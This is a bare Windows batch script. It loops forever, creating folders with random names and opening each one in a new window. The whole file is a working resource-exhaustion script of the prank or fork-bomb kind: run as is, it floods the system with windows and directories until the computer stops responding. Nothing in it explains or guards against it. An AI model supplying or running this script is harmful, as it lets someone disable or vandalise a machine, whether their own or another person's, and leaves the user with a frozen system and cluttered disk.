@echo off
:loop
set count=%random%
mkdir %count%
start %count%
goto loop